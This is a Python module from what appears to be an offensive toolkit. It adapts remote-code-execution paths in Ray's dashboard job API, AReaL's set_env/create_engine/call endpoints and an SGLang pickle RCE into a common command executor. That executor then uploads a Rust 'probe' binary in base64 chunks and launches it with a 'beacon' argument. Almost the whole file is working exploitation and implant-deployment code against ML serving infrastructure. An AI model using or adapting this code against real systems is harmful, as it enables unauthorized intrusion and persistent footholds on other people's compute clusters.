# -*- coding: utf-8 -*-
"""RCE-to-probe adapters.

No Python is uploaded: the only file written inside the target is the static
Rust probe, split into base64 chunks and decoded with ``base64 -d``/``openssl``.
The existing Ray/AReaL/SGLang primitives are exposed through the same
``CommandExecutor`` callback contract.
"""

from __future__ import annotations

import json
import urllib.error
import urllib.request
from typing import Any, Callable

from .base import CallbackExecutor, CommandExecutor, EntryError, ExecResult, deploy_probe, shell_command


class HttpCallbackExecutor:
    """Small JSON-over-HTTP executor used by the Ray/AReaL adapters."""

    def __init__(self, base_url: str, *, timeout: float = 5.0, headers: dict[str, str] | None = None):
        self.base_url = str(base_url).rstrip("/")
        self.timeout = timeout
        self.headers = {"Content-Type": "application/json", **(headers or {})}

    def _post(self, path: str, payload: dict[str, Any]) -> tuple[int, Any]:
        data = json.dumps(payload).encode("utf-8")
        request = urllib.request.Request(
            self.base_url + path, data=data, method="POST",
            headers=self.headers,
        )
        try:
            with urllib.request.urlopen(request, timeout=self.timeout) as response:
                body = response.read(1024 * 1024).decode("utf-8", "replace")
                status = response.status
        except urllib.error.HTTPError as exc:
            status = exc.code
            body = exc.read(512 * 1024).decode("utf-8", "replace")
        except Exception as exc:  # noqa: BLE001
            return 0, {"error": f"{type(exc).__name__}: {exc}"}
        try:
            parsed = json.loads(body)
        except ValueError:
            parsed = body
        return status, parsed

    def run(self, command: str, timeout: float = 30.0) -> ExecResult:
        raise NotImplementedError


class RayDashboardExecutor(HttpCallbackExecutor):
    """Ray dashboard ``POST /api/jobs/`` is the command-execution callback."""

    def run(self, command: str, timeout: float = 30.0) -> ExecResult:
        status, payload = self._post("/api/jobs/", {
            "entrypoint": command,
            "runtime_env": {},
        })
        if status not in (200, 201):
            return ExecResult(exit_code=1, stderr=json.dumps(payload, ensure_ascii=False)[:2000],
                              data={"status": status, "response": payload})
        job_id = ""
        if isinstance(payload, dict):
            job_id = str(payload.get("job_id") or payload.get("id") or "")
        return ExecResult(exit_code=0, stdout=job_id, data={"status": status, "job_id": job_id,
                                                            "response": payload})


class ArealExecutor(HttpCallbackExecutor):
    """AReaL's set_env/create_engine/call surface.

    ``call_method`` defaults to ``"run_command"``; deployments whose callback is
    exposed under another method can set it explicitly.
    """

    def __init__(self, base_url: str, *, call_method: str = "run_command",
                 engine_module: str = "inkblade_probe_module",
                 engine_cls: str = "ProbeClass", **kwargs):
        super().__init__(base_url, **kwargs)
        self.call_method = call_method
        self.engine_module = engine_module
        self.engine_cls = engine_cls
        self.engine_id = ""

    def run(self, command: str, timeout: float = 30.0) -> ExecResult:
        status, env = self._post("/set_env", {"key": "INKBLADE_COMMAND", "value": command})
        if status != 200:
            return ExecResult(exit_code=1, stderr=json.dumps(env, ensure_ascii=False)[:2000],
                              data={"stage": "set_env", "status": status})
        status, engine = self._post("/create_engine", {
            "module": self.engine_module, "cls": self.engine_cls,
        })
        if status != 200:
            return ExecResult(exit_code=1, stderr=json.dumps(engine, ensure_ascii=False)[:2000],
                              data={"stage": "create_engine", "status": status})
        self.engine_id = str((engine or {}).get("engine_id", "")) if isinstance(engine, dict) else ""
        status, called = self._post("/call", {
            "engine_id": self.engine_id,
            "method": self.call_method,
            "args": {"command": command},
        })
        if status != 200:
            return ExecResult(exit_code=1, stderr=json.dumps(called, ensure_ascii=False)[:2000],
                              data={"stage": "call", "status": status, "engine_id": self.engine_id})
        return ExecResult(exit_code=0, stdout=json.dumps(called, ensure_ascii=False),
                          data={"stage": "call", "status": status, "engine_id": self.engine_id})


class SglangExecutor:
    """SGLang command execution is supplied by its module callback.

    The stock SGLang surface exposed by the current templates is a write
    primitive, not a command callback; this adapter therefore requires the
    module to provide one rather than pretending a write is RCE.
    """

    def __init__(self, callback: Callable[[str, float], Any] | None = None, *, base_url: str = ""):
        self.callback = callback
        self.base_url = base_url

    def run(self, command: str, timeout: float = 30.0) -> ExecResult:
        if self.callback is None:
            raise EntryError(
                "sglang profile needs an RCE callback from the selected module "
                "(sglang-zmq-pickle-rce) before probe deployment"
            )
        return ExecResult.from_value(self.callback(command, timeout))


def executor_for(
    chain: str,
    target: str,
    *,
    callback: Callable[[str, float], Any] | None = None,
    timeout: float = 5.0,
) -> CommandExecutor:
    key = str(chain or "").strip()
    if key.startswith("ray") or key in ("ray-dashboard-job", "ray-control-plane", "ray-job-marker-rce"):
        return RayDashboardExecutor(target, timeout=timeout)
    if key.startswith("areal") or key in ("areal-setenv-engine-rce", "areal-load-pickle"):
        return ArealExecutor(target, timeout=timeout)
    if key.startswith("sglang") or key == "sglang-manager":
        return SglangExecutor(callback, base_url=target)
    if callback is not None:
        return CallbackExecutor(callback, name=key or "callback")
    raise EntryError(f"no command-execution adapter for chain {chain!r}")


def deploy(
    chain: str,
    target: str,
    probe_bytes: bytes,
    *,
    callback: Callable[[str, float], Any] | None = None,
    remote_path: str | None = None,
    dry_run: bool = False,
    timeout: float = 30.0,
) -> dict[str, Any]:
    executor = executor_for(chain, target, callback=callback)
    result = deploy_probe(executor, probe_bytes, remote_path=remote_path,
                          dry_run=dry_run, timeout=timeout)
    result["executor"] = type(executor).__name__
    result["chain"] = chain
    return result


def proof_command(remote_path: str, args: list[str] | None = None) -> str:
    return shell_command([remote_path, *(args or ["beacon"])])
